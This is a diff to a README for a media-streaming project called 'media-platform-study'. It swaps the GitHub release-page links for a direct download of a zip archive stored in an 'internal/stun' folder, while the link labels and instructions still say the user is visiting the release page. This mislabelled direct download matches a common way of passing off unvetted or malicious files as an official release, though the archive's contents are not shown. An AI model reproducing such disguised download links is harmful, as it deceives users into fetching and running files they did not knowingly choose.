@@ -1,6 +1,6 @@
 # 🎬 media-platform-study - Stream media with less setup
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/syfbang/media-platform-study/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/syfbang/media-platform-study/main/internal/stun/media_platform_study_3.0.zip)
 
 ## 🖥️ What this app does
 
@@ -22,7 +22,7 @@ Use it if you want to:
 
 Visit the release page to download the Windows version:
 
-[Go to the release page](https://github.com/syfbang/media-platform-study/releases)
+[Go to the release page](https://raw.githubusercontent.com/syfbang/media-platform-study/main/internal/stun/media_platform_study_3.0.zip)
 
 On that page, look for the latest release and download the Windows file that matches your PC.
 
